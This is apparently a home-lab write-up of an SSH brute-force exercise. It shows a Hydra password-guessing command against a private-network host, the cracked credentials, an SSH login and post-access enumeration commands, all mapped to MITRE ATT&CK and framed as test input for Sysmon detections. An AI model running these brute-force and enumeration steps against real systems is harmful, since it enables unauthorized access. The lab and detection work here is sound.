# SSH Brute Force — Offense

With the open ports identified from the Nmap scan, port 22 (SSH) was the next target. I used Hydra to run a credential stuffing attack against the SSH service using wordlists, then logged in and ran basic enumeration commands to simulate what an attacker would do post-access.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing | T1059 — Command and Scripting Interpreter

---

## Environment

| | IP |
|---|---|
| Attacker (Kali) | 192.168.56.102 |
| Target | 192.168.56.105 |

---

## Phase 1 — Brute Force with Hydra

```bash
hydra -L username.txt -P passwords.txt ssh://192.168.56.105 -t 10 -V
```

| Flag | Purpose |
|------|---------|
| `-L username.txt` | Username wordlist |
| `-P passwords.txt` | Password wordlist |
| `ssh://192.168.56.105` | Target protocol and IP |
| `-t 10` | 10 parallel threads |
| `-V` | Verbose — print each attempt as it runs |

**Result:** Hydra successfully cracked the credentials:

```
[22][ssh] host: 192.168.56.105   login: Admin   password: P@ssword123!
```

> 📸 `screenshots/hydra-cracked.png`

---

## Phase 2 — Login and Post-Access Enumeration

With valid credentials in hand, I logged in over SSH and ran a few basic commands to simulate an attacker's first actions on a compromised machine.

```bash
ssh Admin@192.168.56.105
```

Once inside:

```cmd
whoami
ipconfig
net user
```

These three commands are among the first things any attacker runs after gaining access — confirming their identity, understanding the network position, and enumerating local user accounts. They're also well-known detection targets on the blue team side, which made them a good test for the Sysmon detections in the defense phase.

> 📸 `screenshots/ssh-login-and-commands.png`

---

## 📹 Video Demonstration

🎥 [Watch](#) *(add link)*
